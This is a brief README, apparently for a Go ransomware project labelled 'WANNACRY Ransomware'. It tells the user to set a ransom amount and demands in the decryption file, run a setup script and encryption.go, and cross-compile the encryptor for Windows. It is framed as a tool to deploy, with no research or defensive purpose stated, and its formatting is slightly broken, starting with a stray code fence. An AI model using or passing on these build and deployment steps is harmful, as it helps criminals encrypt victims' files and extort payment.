# WANNACRY Ransomware

change the message in the decryption file to your desired amount and requirements
```

Set up 'home' target directory:
```
./setup-env.sh
```

Run locally:
```
go run encryption.go
```

Compile for windows:
```
env GOOS=windows GOARCH=amd64 go build encryption.go
```
